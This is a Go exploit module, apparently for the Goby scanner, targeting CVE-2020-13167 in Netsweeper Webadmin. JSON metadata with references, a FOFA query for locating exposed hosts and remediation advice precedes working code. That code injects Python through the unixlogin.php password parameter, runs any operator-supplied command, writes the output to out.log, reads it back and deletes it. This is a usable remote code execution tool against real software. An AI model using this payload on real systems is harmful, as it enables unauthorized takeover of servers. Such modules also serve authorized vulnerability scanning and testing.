package exploits

import (
	"bytes"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Netsweeper Webadmin unixlogin.php RCE (CVE-2020-13167)",
    "Description": "Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters.",
    "Impact": "Netsweeper Webadmin unixlogin.php RCE (CVE-2020-13167)",
    "Recommendation": "<p>1. Intercept access to the /webadmin/tools/unixlogin.php directory</p><p>2. Update Patches</p>",
    "Product": "netsweeper",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Netsweeper Webadmin 系统 unixlogin.php 文件远程命令执行漏洞（CVE-2020-13167）",
            "Description": "<p>Netsweeper是加拿大Netsweeper公司的一套Web内容过滤解决方案系统。</p><p>Netsweeper 6.4.3及之前版本中的/webadmin/tools/unixlogin.php脚本存在安全漏洞。攻击者可利用该漏洞执行任意代码从而接管服务器权限。</p>",
            "Impact": "<p>Netsweeper 6.4.3及之前版本中的/webadmin/tools/unixlogin.php脚本存在安全漏洞。攻击者可利用该漏洞执行任意代码从而接管服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.netsweeper.com\">https://www.netsweeper.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "netsweeper",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Netsweeper Webadmin unixlogin.php RCE (CVE-2020-13167)",
            "Description": "Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters.",
            "Impact": "Netsweeper Webadmin unixlogin.php RCE (CVE-2020-13167)",
            "Recommendation": "<p>1.&nbsp;Intercept access to the /webadmin/tools/unixlogin.php directory</p><p>2.&nbsp;Update Patches</p>",
            "Product": "netsweeper",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"netsweeper\" && body=\"webAdmin\"",
    "GobyQuery": "title=\"netsweeper\" && body=\"webAdmin\"",
    "Author": "李大壮",
    "Homepage": "https://www.netsweeper.com/",
    "DisclosureDate": "2021-05-27",
    "References": [
        "https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/",
        "https://nvd.nist.gov/vuln/detail/CVE-2020-13167",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13167"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2020-13167"
    ],
    "CNVD": [
        "CNVD-2020-34458"
    ],
    "CNNVD": [
        "CNNVD-202005-974"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "netsweeper"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10212"
}`

	verifyUri := "/webadmin/out.log"
	resultPath := "/usr/local/netsweeper/webadmin/out.log"

	genPayload := func(cmd string) (payload string) {
		var buffer bytes.Buffer
		buffer.WriteString("/webadmin/tools/unixlogin.php?login=admin")
		buffer.WriteString("&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%27")
		buffer.WriteString(fmt.Sprintf("%x", cmd))
		buffer.WriteString("%27.decode%28%27hex%27%29%29%23&timeout=5")
		return buffer.String()
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(6)
			payloadUri := genPayload(fmt.Sprintf("echo '%s' > %s", checkStr, resultPath))
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + payloadUri); err == nil {
				if resp.StatusCode == 200 {
					if resp, err := httpclient.SimpleGet(u.FixedHostInfo + verifyUri); err == nil {
						httpclient.SimpleGet(u.FixedHostInfo + genPayload(fmt.Sprintf("rm -f %s", resultPath)))
						return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkStr)
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			payloadUri := genPayload(fmt.Sprintf("%s > %s", cmd, resultPath))
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + payloadUri); err == nil {
				if resp.StatusCode == 200 {
					if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + verifyUri); err == nil {
						httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + genPayload(fmt.Sprintf("rm -f %s", resultPath)))
						expResult.Success = true
						expResult.Output = resp.Utf8Html
					}
				}
			}
			return expResult
		},
	))
}
